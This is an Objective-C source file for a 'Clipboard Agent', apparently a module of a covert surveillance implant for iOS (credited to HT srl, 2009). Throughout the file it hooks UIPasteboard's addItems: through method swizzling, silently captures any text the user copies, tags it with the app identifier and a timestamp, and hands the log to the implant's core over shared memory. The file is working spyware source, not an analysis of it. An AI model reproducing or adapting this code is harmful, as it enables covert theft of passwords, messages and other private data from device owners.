/*
 * RCSMac - Clipboard Agent
 * 
 *
 * Created by Massimo Chiodini on 17/06/2009
 *
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */
#import <objc/runtime.h>

#import "RCSIAgentPasteboard.h"
#import "RCSISharedMemory.h"
#import "RCSICommon.h"

//#define DEBUG

#define LOG_DELIMITER 0xABADC0DE

@implementation agentPasteboard

+ (NSData*)getPastebordText:(NSArray*)items
{
  NSData  *clipboardContent = nil;
  
  for (int i=0; i<[items count]; i++) 
    {
      NSDictionary *tmpItem = (NSDictionary*)[items objectAtIndex:i];
      
      if (tmpItem) 
        {
          NSData *_data = nil;
          
          // get only text (iOS 3.x/4.x)
          _data = [tmpItem objectForKey: @"public.utf8-plain-text"];
          
          // try to get another key (iOS5)
          if (_data == nil)
            _data = [tmpItem objectForKey:@"public.text"];
          
          if (_data == nil)
            continue;
          
          if ([_data isKindOfClass: [NSString class]]) 
            {
              clipboardContent =
              [(NSString*)_data dataUsingEncoding: NSUTF16LittleEndianStringEncoding 
                             allowLossyConversion: YES];
            }
          else if ([_data isKindOfClass: [NSData class]] ||
                   [_data isKindOfClass: [NSMutableData class]])
            {
              NSString *dataString = [[NSString alloc] initWithData: _data
                                                           encoding: NSUTF8StringEncoding];                  
              clipboardContent = 
              [NSData dataWithData: [dataString dataUsingEncoding: NSUTF16LittleEndianStringEncoding
                                             allowLossyConversion: YES]];
              [dataString release];
            }
          
          break;
        }
    }
  
  return clipboardContent;
}
  
- (void)addItemsHook: (NSArray *)items
{
  [self addItemsHook: items];
  
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];

  short unicodeNullTerminator = 0x0000;
  NSString      *_windowName;
  NSString      *_processName;
  NSMutableData *processName;
  NSMutableData *windowName;
  NSData        *clipboardContent = nil;
  
  if (items)
    {   
      clipboardContent = [agentPasteboard getPastebordText:items];
      
      if (clipboardContent == nil)
        {
          [pool release];
          return;
        }
      
      NSMutableData   *logData = [[NSMutableData alloc] initWithLength: sizeof(shMemoryLog)];
      NSMutableData *entryData = [[NSMutableData alloc] init];
    
      _processName = [[NSBundle mainBundle] bundleIdentifier];
      _windowName  = [[[NSBundle mainBundle] bundleIdentifier] lastPathComponent];
      
      if (_windowName == nil || [_windowName length] == 0) 
        _windowName = @"unknown";
      
      time_t rawtime;
      struct tm *tmTemp;

      // Struct tm
      time (&rawtime);
      tmTemp = gmtime(&rawtime);
      tmTemp->tm_year += 1900;
      tmTemp->tm_mon  ++;
      
      [entryData appendBytes: (const void *)tmTemp
                      length: sizeof (struct tm) - 0x8];
      processName  = 
        [[NSMutableData alloc] initWithData:[_processName dataUsingEncoding:NSUTF16LittleEndianStringEncoding]];
    
      // Process Name + null terminator
      [entryData appendData: processName];
      [entryData appendBytes: &unicodeNullTerminator
                      length: sizeof(short)];

      [processName release];
      
      windowName = 
        [[NSMutableData alloc] initWithData:[_windowName dataUsingEncoding:NSUTF16LittleEndianStringEncoding]];
      
      // windowname + null terminator 
      [entryData appendData: windowName];
      [entryData appendBytes: &unicodeNullTerminator
                      length: sizeof(short)];
      
      [windowName release];
    
      // Clipboard + null terminator
      [entryData appendData: clipboardContent];
      [entryData appendBytes: &unicodeNullTerminator length: sizeof(short)];
    
      // Delimiter
      uint32_t del = LOG_DELIMITER;
      [entryData appendBytes: &del length: sizeof(del)];

      
      shMemoryLog *shMemoryHeader     = (shMemoryLog *)[logData bytes];
      shMemoryHeader->status          = SHMEM_WRITTEN;
      shMemoryHeader->agentID         = LOG_CLIPBOARD;
      shMemoryHeader->direction       = D_TO_CORE;
      shMemoryHeader->commandType     = CM_LOG_DATA;
      shMemoryHeader->flag            = 0;
      shMemoryHeader->commandDataSize = [entryData length];
      
      memcpy(shMemoryHeader->commandData,
             [entryData bytes],
             [entryData length]);
    
      [entryData release];
    
      [[RCSISharedMemory sharedInstance] writeIpcBlob: logData];
    
      [logData release];
    }
  
  [pool release];
}

- (id)init
{
  self = [super init];
  
  if (self != nil)
    mAgentID = AGENT_CLIPBOARD;
  
  return self;
}

- (BOOL)start
{
  BOOL retVal = TRUE;
  
  if ([self mAgentStatus] == AGENT_STATUS_STOPPED )
    {
      Class className   = objc_getClass("UIPasteboard");
      Class classSource = [self class];
      
      if (className != nil)
        {
          IMP newImpl = class_getMethodImplementation(classSource, @selector(addItemsHook:));
          
          [self swizzleByAddingIMP:className 
                           withSEL:@selector(addItems:) 
                    implementation:newImpl
                      andNewMethod:@selector(addItemsHook:)];
          
          /*
           * checking for a valid method swapping before return OK
           * [self validateHook];
           */
          
          [self setMAgentStatus: AGENT_STATUS_RUNNING];
        
        }
    }
  return retVal;
}

- (void)stop
{
  if ([self mAgentStatus] == AGENT_STATUS_RUNNING )
    {
      Class className = objc_getClass("UIPasteboard");
      
      if (className != nil)
        {
          IMP oldImpl = class_getMethodImplementation(className, @selector(addItemsHook:));
        
          [self swizzleByAddingIMP:className 
                           withSEL:@selector(addItems:) 
                    implementation:oldImpl
                      andNewMethod:@selector(addItemsHook:)];
          /*
           * checking for a valid method swapping before return OK
           * [self validateHook];
           */
          
          [self setMAgentStatus: AGENT_STATUS_STOPPED];
        } 
    }
}

@end